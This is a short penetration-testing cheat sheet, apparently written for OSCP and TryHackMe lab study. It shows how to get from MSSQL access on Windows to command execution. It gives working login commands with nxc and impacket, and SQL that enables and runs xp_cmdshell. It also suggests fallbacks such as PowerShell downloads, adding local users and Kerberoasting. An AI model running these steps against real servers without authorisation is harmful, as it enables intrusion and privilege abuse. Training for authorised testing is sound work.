# MSSQL To Command Execution

Use when TCP `1433` is open or credentials mention SQL/DB access on Windows.

## Signals

- Port `1433` or SQL Browser.
- `impacket-mssqlclient` authenticates.
- Web config contains MSSQL connection string.
- AD service account named `sqlservice`, `mssql`, or similar.

## Main Path

```bash
nxc mssql target -u user -p 'pass'
impacket-mssqlclient user:pass@target -windows-auth
impacket-mssqlclient domain.local/user:pass@target -windows-auth
```

Useful SQL:

```sql
select @@version;
select name from master..sysdatabases;
select name from sys.server_principals;
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Options To Try

- If Windows auth fails, try SQL auth without `-windows-auth`.
- If `xp_cmdshell` is disabled and you have `sa`/sysadmin, enable it in lab scope.
- If command execution works but no shell returns, use file read/write proof, PowerShell download, or add a local user only when allowed.
- If low privilege, enumerate databases for credentials and linked servers.
- If SQL service account is domain-joined, check Kerberoasting and AD rights.

## Study Examples

- OSCP and TryHackMe Windows/AD patterns often use SQL service accounts as Kerberos targets or command execution pivots.
